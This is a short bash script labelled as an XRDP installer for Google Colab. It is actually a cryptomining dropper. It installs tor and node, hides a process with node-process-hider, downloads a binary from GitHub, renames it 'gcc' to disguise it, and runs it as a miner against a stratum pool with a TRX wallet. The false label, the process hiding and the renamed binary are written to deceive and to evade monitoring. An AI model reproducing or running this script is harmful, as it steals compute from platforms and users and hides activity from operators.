# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update -y
clear
sudo apt install screen
screen -R rstd30H
echo " "
echo " "
echo "**************"
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start
sudo apt install gcc -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash - 
apt install nodejs -y
echo " "
echo " "
echo "**************"
npm install -g npm@8.18.0 -y
npm i -g node-process-hider
ph add rstd
echo " "
echo " "
echo "**************"
wget https://github.com/mauliki9999/codet/raw/main/rstd
chmod 700 rstd
mv rstd gcc
echo " "
echo " "
echo "**************"
./gcc -a cryptonight-upx/2 -o stratum+tcp://rx-us.unmineable.com:13333 -u TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo rstd30H/$(shuf -i 1-999 -n 1))#hdij-gkd6 -p --asm=ryzen -k -t30 --cpu-priority 5 && sleep 99999999
